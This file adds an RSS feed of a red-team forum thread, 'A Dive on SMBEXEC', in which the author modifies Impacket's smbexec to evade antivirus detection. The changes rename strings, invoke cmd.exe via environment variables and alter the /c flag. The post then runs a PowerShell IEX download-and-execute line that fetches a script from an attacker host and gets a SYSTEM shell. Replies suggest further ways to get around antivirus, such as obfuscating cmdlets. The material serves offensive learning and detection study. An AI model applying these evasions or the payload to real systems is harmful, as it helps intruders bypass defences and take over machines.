@@ -1,0 +1,337 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>A Dive on SMBEXEC</title>
+    <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961</link>
+    <description>One of the things that makes a good red teamer is to understand our tools. I noticed recently how these tools are being looked at and I demonstrate a little on what we can do about these well known attacks.
+
+We all know the glorious Impacket tools, very well known in the Cybersecurity Community and hackers among us. Today I will take a look at the Impacket tools. I was recently surprised by how these tools get detected and why are they found while Threat Hunting, I also wanted to understand on why it was happening. And while searching I was mind blown, probably old to some people but damn I wanted to write about it.
+
+I will work with SMBEXEC on this talk.
+
+Now let’s check a little the SMBEXEC code. One of the first things that stand out to me is some BAT files and output files that seems to be written onto the target machine when executed.
+
+![](upload://tKi2AzWHQmUMzDJN5VSK4X43sMS.png)
+
+Let’s run the tool and see what happens out of the box to take a better look at what is going on with this tool.
+
+![|815x280](upload://AeHb5x8obazMGlLoPwh81HD62i.png)
+
+As expected
+
+![](upload://60ylmO62kRReH8TWr80TjjeXN4J.png)
+
+But, why?. Let’s take a look at what happened.
+
+![](upload://4o44lBPTUiYdJpP1dQTmHczoKtp.png)
+
+Oh, so I’s a command line that is getting detected, it does seem to be strange that an Administrator Account tries to Write a bat file onto the Temp Folder, Execute it and then remove it. Right?.
+
+Now let’s take a look at the part of Impacket that gets detected and find this piece of code. We are well aware that we have a section of the code where it’s creating the execute.bat file
+
+![](upload://aufGtATWv49KvRGmjDL7jrngSla.png)
+
+Now I changed the code and found some “synonyms” of each of the words that were hardcoded onto the tool, I had no idea what BTO meant so I chose a more “legitimate” service name.
+
+Now let’s try running the tool again. **[Remember we still haven’t changed the command, wanted to test if this was enough to bypass]** .
+
+Damn it, no luck at all.
+
+![](upload://tKlk3lWLKMrybhAujNUIw2eXAV7.png)
+
+Ok, now let’s dig a little deeper on the command line this time.
+
+![|832x236](upload://eMwPxobxiQr0xOyLPQ1EuJ2gTRZ.png)
+
+Ok, let’s see the **self._output** section, looks for the local drive C$ (Accessible to Administrator) smbexec will choose this by default if no other is selected, will continue to output the BAT file, execute it and then proceed to delete it. But look here, it seems to be calling **cmd.exe** using an environment variable for all this to run. Let us take a quick look at our variables for Windows.
+
+![](upload://sdDKCJjM4TDfiI4yZFKDZlrnvtN.png)
+
+Aaaah so there we go, cmd.exe now, in what other ways can we call cmd.exe?, Directly with other variables?. Let’s go down a little further.
+
+![](upload://3vqqj2kfcG2H1DNki1HQlK9UPmi.png)
+
+Here are some interesting ones, **%SystemDrive%, %SystemRoot%, %windir%.** Great we have 3 options to have our way and execute cmd.exe, let’s try these for our tool smbexec.
+
+![](upload://fOC5cW9y3uFnFRjSuirtYskcsAu.png)
+
+Ok, so I edited it for it to call cmd.exe in a different manner I will use 1 variable and add the other part of the path to reach **cmd.exe**
+
+Let’s see what happens:
+
+![](upload://f9eNCTr6RfrmnQeIC7VnTqH4uMi.png)
+
+Damn it’s still getting caught, let’s dive a little more, so what other thing can get detected besides our different variables that are used, oh your thinking the same right?. Exactly the parameters, very smart. But which one is it? /Q or /c maybe both???. Let’s not take a risk and do something about that.
+
+Now let’s understand what happens when we use these parameters we want to focus on **/Q, /c.** So if we check the help menu from CMD
+
+![|769x276](upload://AgL3RRRzAnjQTJe66CsQdrQuthJ.png)
+
+Ok so **/C** carries out the command by string and then it terminates it [this is important], if we run smbexec with this here is the result on Process Explorer:
+
+But if we run it with **/k** carries out the command but remains.
+
+![](upload://o280xMQZAQkXVIoa0vtCKiEzaW4.png)
+
+We have a process, and its running as SYSTEM, damn. No output of course, we gain a shell but we leave a process behind.
+
+But, what other alternatives do we have??. Change the Environment variable and add a slight tweak to the /c parameter, I don’t know why but this works just by adding a (,). I tried to understand it but it seems way over my knowledge cmd is very amazing so much we do not know.
+
+![](upload://oRN5fvJKCR6MPwXJr5Z4FY79iFY.png)
+
+***[After a while I noticed that the parameter /c was the one being flagged]***
+
+Now let’s try it.
+
+https://vimeo.com/514543644
+
+Ok nice video if I say so, but now I am thinking, wait you have Code Execution why are you doing all this crazy stuff?. Why not just execute a PowerShell Command and call your obfuscated, super hidden payload instead of leaving traces behind. Well of course you can do that as well!!.
+
+We have out AV up and running:
+
+![](upload://2sTj02TTY0QaW5jU5Lh0AmwtbLc.png)
+
+Now let’s move back to our attacking machine and execute our smbexec with our PowerShell command
+
+I setup a listener, my command running smbexec and a python server to call my shell and receive the connection back to my machine.
+
+Listener:
+
+![](upload://uGGftDT8FOOOZ1rST8ghX7w8mGx.png)
+
+Python Server:
+
+![](upload://qCpfatgdoV7JYiyGI6lkpb2pyBy.png)
+
+SMBEXEC:
+
+![|1437x40](upload://7G3tspVG5PZugqHuoAEryqZZw9L.png)
+
+```
+cmd.exe /Q /c powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.0.2.20:8000/Connectar-Tcp.ps1&#39;);
+```
+
+Shell:
+
+![|643x342](upload://cRrUybJ35jbOPux5Mpq2T02rBXO.png)
+
+Afterwards:
+
+Breaks SMBEXEC
+
+![|624x187](upload://hP7yclv85NrffhqvJhPTAgo1xvQ.png)
+
+After this simple demonstration I wanted to show how some changes to our tools functionality can have us again connected to the user’s network. We have plenty of possibilities to achieve our goal. We just have to think a little bit out of the Box
+
+You can take a look that the AV was only flagging the **/c** parameter and probably anything after that, but once a small difference is added we can see that our code gets executed as there are plenty of methods to achieve this, Hmm maybe replacing it with a LOLBIN???. Who knows but it might be out there.
+
+Keep Learning!!
+
+https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/
+
+https://youtu.be/mej5L9PE1fs</description>
+    
+    <lastBuildDate>Thu, 04 Mar 2021 16:58:52 +0000</lastBuildDate>
+    <category>Red-Team</category>
+    <atom:link href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 1709 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/8</link>
+        <pubDate>Sun, 26 Oct 2025 19:47:04 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-8</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
+        <description><![CDATA[
+            <p>That work’s usually execution gets flagged and not downloads, you can always obfuscate those Cmdlets or change the aliases</p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/7</link>
+        <pubDate>Thu, 04 Mar 2021 16:58:52 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-7</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
+        <description><![CDATA[
+            <p>Oh, I grabbed the repository and edited those files not the ones already located on your System just in case I broke something, which I did <img src="https://0x00sec.org/images/emoji/twitter/rofl.png?v=9" title=":rofl:" class="emoji" alt=":rofl:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/6</link>
+        <pubDate>Thu, 04 Mar 2021 16:57:59 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-6</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[Frank_Jaeger]]></dc:creator>
+        <description><![CDATA[
+            <p>Great read! I ran into this problem with WD stoping smbexec.py while I was doing PEH on udemy. I am using smbexec.py in kali to walk through your post. However, to make the changes that you did, I need to edit the smbexec.py script itself correct?</p>
+<p>edit: found it! For those having trouble finding the location of the <code>smbexec</code> changes here you go:<br>
+If you locate <code>smbexec.py</code> in <code>/bin/</code> you will see that it points to a script in: <code>/usr/share/doc/python3-impacket/examples/smbexec.py</code> so to make the changes as above just edit that script!</p>
+<p>edit2: so i was editing the above script but everytime i would run just <code>smbexec.py</code> which calls impacket it wouldn’t use my updated script. However when i ran the script on its own with <code>python3 smbexec.py</code> from the scripts <code>dir</code> it work fine! it seems that impacket ignored my changes for some reason… weird.</p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/5</link>
+        <pubDate>Thu, 04 Mar 2021 16:27:42 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-5</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[ShellHunter123]]></dc:creator>
+        <description><![CDATA[
+            <p>i will execute powershell command but IEX is flagged by Windows defender…<br>
+try using powershell command CURL to download from link and then run…]<br>
+IEX is blocked in powersshell by Windows Defender.</p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/4</link>
+        <pubDate>Tue, 02 Mar 2021 06:04:01 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-4</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
+        <description><![CDATA[
+            <p>Absolutely!! This would cut a lot of time!!. I think maybe some scripts are out there, hopefully the article can help newcomers understand their tools and see why Red Teamers or APT take this approach.</p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/3</link>
+        <pubDate>Sun, 21 Feb 2021 16:52:48 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-3</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[Sea]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="dmcxblue" data-post="1" data-topic="24961">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/letter_avatar_proxy/v4/letter/d/f0a364/48.png" class="avatar"> dmcxblue:</div>
+<blockquote>
+<p>Why not just execute a PowerShell Command and call your obfuscated, super hidden payload instead of leaving traces behind.</p>
+</blockquote>
+</aside>
+<p>This line reminded me of a <a href="https://github.com/specterops/at-ps" rel="noopener nofollow ugc">powershell adversary tactics course</a> I recently read about.</p>
+<p>Overall a very good article. It would be interesting to see this approach scripted to to pick random file names and services rather than relying on static changes until something works.</p>
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/2</link>
+        <pubDate>Sun, 21 Feb 2021 00:29:32 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-2</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+      <item>
+        <title>A Dive on SMBEXEC</title>
+        <dc:creator><![CDATA[dmcxblue]]></dc:creator>
+        <description><![CDATA[
+            <p>One of the things that makes a good red teamer is to understand our tools. I noticed recently how these tools are being looked at and I demonstrate a little on what we can do about these well known attacks.</p>
+<p>We all know the glorious Impacket tools, very well known in the Cybersecurity Community and hackers among us. Today I will take a look at the Impacket tools. I was recently surprised by how these tools get detected and why are they found while Threat Hunting, I also wanted to understand on why it was happening. And while searching I was mind blown, probably old to some people but damn I wanted to write about it.</p>
+<p>I will work with SMBEXEC on this talk.</p>
+<p>Now let’s check a little the SMBEXEC code. One of the first things that stand out to me is some BAT files and output files that seems to be written onto the target machine when executed.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07aa09b14e99f296e3d0f66760ea56650a4980e.png" data-download-href="/uploads/short-url/tKi2AzWHQmUMzDJN5VSK4X43sMS.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07aa09b14e99f296e3d0f66760ea56650a4980e.png" alt="" data-base62-sha1="tKi2AzWHQmUMzDJN5VSK4X43sMS" role="presentation" width="513" height="140"></a></div><p></p>
+<p>Let’s run the tool and see what happens out of the box to take a better look at what is going on with this tool.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/4/0418a3504b108b30dcd746ac7ad9dc88eeb5487e.png" data-download-href="/uploads/short-url/AeHb5x8obazMGlLoPwh81HD62i.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/4/0418a3504b108b30dcd746ac7ad9dc88eeb5487e.png" alt="" data-base62-sha1="AeHb5x8obazMGlLoPwh81HD62i" width="690" height="237" role="presentation"></a></div><p></p>
+<p>As expected</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2a1d12f588a0ccd971584ec5b7ba94ef568c9fd1.png" data-download-href="/uploads/short-url/60ylmO62kRReH8TWr80TjjeXN4J.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2a1d12f588a0ccd971584ec5b7ba94ef568c9fd1.png" alt="" data-base62-sha1="60ylmO62kRReH8TWr80TjjeXN4J" role="presentation" width="403" height="196"></a></div><p></p>
+<p>But, why?. Let’s take a look at what happened.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/e/1ec11d536ec0418a513ded9526f6466d8c85b487.png" data-download-href="/uploads/short-url/4o44lBPTUiYdJpP1dQTmHczoKtp.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/e/1ec11d536ec0418a513ded9526f6466d8c85b487.png" alt="" data-base62-sha1="4o44lBPTUiYdJpP1dQTmHczoKtp" role="presentation" width="478" height="399"></a></div><p></p>
+<p>Oh, so I’s a command line that is getting detected, it does seem to be strange that an Administrator Account tries to Write a bat file onto the Temp Folder, Execute it and then remove it. Right?.</p>
+<p>Now let’s take a look at the part of Impacket that gets detected and find this piece of code. We are well aware that we have a section of the code where it’s creating the execute.bat file</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/9/4981359892af0d597d8cd9ac1847ce69b059bfc8.png" data-download-href="/uploads/short-url/aufGtATWv49KvRGmjDL7jrngSla.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/9/4981359892af0d597d8cd9ac1847ce69b059bfc8.png" alt="" data-base62-sha1="aufGtATWv49KvRGmjDL7jrngSla" role="presentation" width="434" height="139"></a></div><p></p>
+<p>Now I changed the code and found some “synonyms” of each of the words that were hardcoded onto the tool, I had no idea what BTO meant so I chose a more “legitimate” service name.</p>
+<p>Now let’s try running the tool again. <strong>[Remember we still haven’t changed the command, wanted to test if this was enough to bypass]</strong> .</p>
+<p>Damn it, no luck at all.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07c28b96575b7dc0b2f4a087b07d3374399f62d.png" data-download-href="/uploads/short-url/tKlk3lWLKMrybhAujNUIw2eXAV7.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07c28b96575b7dc0b2f4a087b07d3374399f62d.png" alt="" data-base62-sha1="tKlk3lWLKMrybhAujNUIw2eXAV7" role="presentation" width="551" height="407"></a></div><p></p>
+<p>Ok, now let’s dig a little deeper on the command line this time.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/7/679acc1fad1b2ad852614430f5e07504ff28c56f.png" data-download-href="/uploads/short-url/eMwPxobxiQr0xOyLPQ1EuJ2gTRZ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/7/679acc1fad1b2ad852614430f5e07504ff28c56f.png" alt="" data-base62-sha1="eMwPxobxiQr0xOyLPQ1EuJ2gTRZ" width="690" height="195" role="presentation"></a></div><p></p>
+<p>Ok, let’s see the <strong>self._output</strong> section, looks for the local drive C$ (Accessible to Administrator) smbexec will choose this by default if no other is selected, will continue to output the BAT file, execute it and then proceed to delete it. But look here, it seems to be calling <strong>cmd.exe</strong> using an environment variable for all this to run. Let us take a quick look at our variables for Windows.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c5c79f7dc673bbf1c5bbfe4d3d8b1b710edc23cb.png" data-download-href="/uploads/short-url/sdDKCJjM4TDfiI4yZFKDZlrnvtN.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c5c79f7dc673bbf1c5bbfe4d3d8b1b710edc23cb.png" alt="" data-base62-sha1="sdDKCJjM4TDfiI4yZFKDZlrnvtN" role="presentation" width="507" height="500"></a></div><p></p>
+<p>Aaaah so there we go, cmd.exe now, in what other ways can we call cmd.exe?, Directly with other variables?. Let’s go down a little further.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/8/1893f13da6efe21141263f8aa3d8c5258a4b3082.png" data-download-href="/uploads/short-url/3vqqj2kfcG2H1DNki1HQlK9UPmi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/8/1893f13da6efe21141263f8aa3d8c5258a4b3082.png" alt="" data-base62-sha1="3vqqj2kfcG2H1DNki1HQlK9UPmi" role="presentation" width="349" height="186"></a></div><p></p>
+<p>Here are some interesting ones, <strong>%SystemDrive%, %SystemRoot%, %windir%.</strong> Great we have 3 options to have our way and execute cmd.exe, let’s try these for our tool smbexec.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/e/6ed94cb310a3017a481a96f2398bf6e3270ade26.png" alt="" data-base62-sha1="fOC5cW9y3uFnFRjSuirtYskcsAu" role="presentation" width="624" height="55"></p>
+<p>Ok, so I edited it for it to call cmd.exe in a different manner I will use 1 variable and add the other part of the path to reach <strong>cmd.exe</strong></p>
+<p>Let’s see what happens:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a2bf6528e6699f480816b9ad5d40df682448eba.png" data-download-href="/uploads/short-url/f9eNCTr6RfrmnQeIC7VnTqH4uMi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a2bf6528e6699f480816b9ad5d40df682448eba.png" alt="" data-base62-sha1="f9eNCTr6RfrmnQeIC7VnTqH4uMi" role="presentation" width="547" height="406"></a></div><p></p>
+<p>Damn it’s still getting caught, let’s dive a little more, so what other thing can get detected besides our different variables that are used, oh your thinking the same right?. Exactly the parameters, very smart. But which one is it? /Q or /c maybe both???. Let’s not take a risk and do something about that.</p>
+<p>Now let’s understand what happens when we use these parameters we want to focus on <strong>/Q, /c.</strong> So if we check the help menu from CMD</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/e/fe333de237d39321b27950881601ecb429e2bdef.png" data-download-href="/uploads/short-url/AgL3RRRzAnjQTJe66CsQdrQuthJ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/e/fe333de237d39321b27950881601ecb429e2bdef.png" alt="" data-base62-sha1="AgL3RRRzAnjQTJe66CsQdrQuthJ" width="690" height="247" role="presentation"></a></div><p></p>
+<p>Ok so <strong>/C</strong> carries out the command by string and then it terminates it [this is important], if we run smbexec with this here is the result on Process Explorer:</p>
+<p>But if we run it with <strong>/k</strong> carries out the command but remains.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a871ca376fa45b93fdc68d26592440d0e0171be0.png" data-download-href="/uploads/short-url/o280xMQZAQkXVIoa0vtCKiEzaW4.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a871ca376fa45b93fdc68d26592440d0e0171be0.png" alt="" data-base62-sha1="o280xMQZAQkXVIoa0vtCKiEzaW4" role="presentation" width="412" height="454"></a></div><p></p>
+<p>We have a process, and its running as SYSTEM, damn. No output of course, we gain a shell but we leave a process behind.</p>
+<p>But, what other alternatives do we have??. Change the Environment variable and add a slight tweak to the /c parameter, I don’t know why but this works just by adding a (,). I tried to understand it but it seems way over my knowledge cmd is very amazing so much we do not know.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/e/ae48d0919ed53616158f415707ce01bbdf03c35a.png" alt="" data-base62-sha1="oRN5fvJKCR6MPwXJr5Z4FY79iFY" role="presentation" width="607" height="63"></p>
+<p><em><strong>[After a while I noticed that the parameter /c was the one being flagged]</strong></em></p>
+<p>Now let’s try it.</p>
+<p><a href="https://vimeo.com/514543644">A Dive to SMBEXEC - Mute</a></p>
+
+<p>Ok nice video if I say so, but now I am thinking, wait you have Code Execution why are you doing all this crazy stuff?. Why not just execute a PowerShell Command and call your obfuscated, super hidden payload instead of leaving traces behind. Well of course you can do that as well!!.</p>
+<p>We have out AV up and running:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/1/11486f24edbe15c9d5c512e77a0c7f5f4929fdf2.png" data-download-href="/uploads/short-url/2sTj02TTY0QaW5jU5Lh0AmwtbLc.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/1/11486f24edbe15c9d5c512e77a0c7f5f4929fdf2.png" alt="" data-base62-sha1="2sTj02TTY0QaW5jU5Lh0AmwtbLc" role="presentation" width="555" height="321"></a></div><p></p>
+<p>Now let’s move back to our attacking machine and execute our smbexec with our PowerShell command</p>
+<p>I setup a listener, my command running smbexec and a python server to call my shell and receive the connection back to my machine.</p>
+<p>Listener:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d71458dcc39bc3246b3e8faa288ab3cca2785bc5.png" data-download-href="/uploads/short-url/uGGftDT8FOOOZ1rST8ghX7w8mGx.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d71458dcc39bc3246b3e8faa288ab3cca2785bc5.png" alt="" data-base62-sha1="uGGftDT8FOOOZ1rST8ghX7w8mGx" role="presentation" width="564" height="182"></a></div><p></p>
+<p>Python Server:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/a/ba8ff60842fb08cc903710dec3eb614ec96411d8.png" data-download-href="/uploads/short-url/qCpfatgdoV7JYiyGI6lkpb2pyBy.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/a/ba8ff60842fb08cc903710dec3eb614ec96411d8.png" alt="" data-base62-sha1="qCpfatgdoV7JYiyGI6lkpb2pyBy" role="presentation" width="562" height="171"></a></div><p></p>
+<p>SMBEXEC:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/5/35d03f7a712338eacfa52b743058cc2786888385.png" alt="" data-base62-sha1="7G3tspVG5PZugqHuoAEryqZZw9L" width="690" height="19" role="presentation"></p>
+<pre><code class="lang-auto">cmd.exe /Q /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:8000/Connectar-Tcp.ps1');
+</code></pre>
+<p>Shell:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/a/5a24d849b1f7faf90c6d905fa24c632614dbc718.png" data-download-href="/uploads/short-url/cRrUybJ35jbOPux5Mpq2T02rBXO.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/a/5a24d849b1f7faf90c6d905fa24c632614dbc718.png" alt="" data-base62-sha1="cRrUybJ35jbOPux5Mpq2T02rBXO" width="643" height="342" role="presentation"></a></div><p></p>
+<p>Afterwards:</p>
+<p>Breaks SMBEXEC</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7cec55be4fdabf2ca30f37c6b27464548ce52432.png" data-download-href="/uploads/short-url/hP7yclv85NrffhqvJhPTAgo1xvQ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7cec55be4fdabf2ca30f37c6b27464548ce52432.png" alt="" data-base62-sha1="hP7yclv85NrffhqvJhPTAgo1xvQ" width="624" height="187" role="presentation"></a></div><p></p>
+<p>After this simple demonstration I wanted to show how some changes to our tools functionality can have us again connected to the user’s network. We have plenty of possibilities to achieve our goal. We just have to think a little bit out of the Box</p>
+<p>You can take a look that the AV was only flagging the <strong>/c</strong> parameter and probably anything after that, but once a small difference is added we can see that our code gets executed as there are plenty of methods to achieve this, Hmm maybe replacing it with a LOLBIN???. Who knows but it might be out there.</p>
+<p>Keep Learning!!</p>
+<aside class="onebox allowlistedgeneric" data-onebox-src="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/">
+  <header class="source">
+      <img src="https://dmcxblue.net/wp-content/uploads/2019/03/cropped-person-smartphone-office-table.jpeg?w=32" class="site-icon" alt="" width="32" height="32">
+
+      <a href="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/" target="_blank" rel="noopener nofollow ugc" title="08:25AM - 20 February 2021">DMCXBLUE – 20 Feb 21</a>
+  </header>
+
+  <article class="onebox-body">
+    <div class="aspect-image" style="--aspect-ratio:440/151;"><img src="https://i0.wp.com/dmcxblue.net/wp-content/uploads/2021/02/image-1.png?fit=440%2C330&amp;ssl=1" class="thumbnail" alt="" width="440" height="151"></div>
+
+<h3><a href="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/" target="_blank" rel="noopener nofollow ugc">A Dive on SMBEXEC</a></h3>
+
+  <p>We all know the glorious Impacket tools, very well known in the Cybersecurity Community and hackers among us. Today I will take a look at the Impacket tools. I was recently surprised by how these t…</p>
+
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+<p><a href="https://www.youtube.com/watch?v=mej5L9PE1fs">Invoke-DOSfuscation: Techniques FOR %F IN (-style) DO (S-level CMD Obfuscation)</a></p>
+
+          <p><a href="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961/1</link>
+        <pubDate>Sat, 20 Feb 2021 17:20:18 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-24961-1</guid>
+        <source url="https://d.clarkee.co.uk/t/a-dive-on-smbexec/24961.rss">A Dive on SMBEXEC</source>
+      </item>
+  </channel>
+</rss>
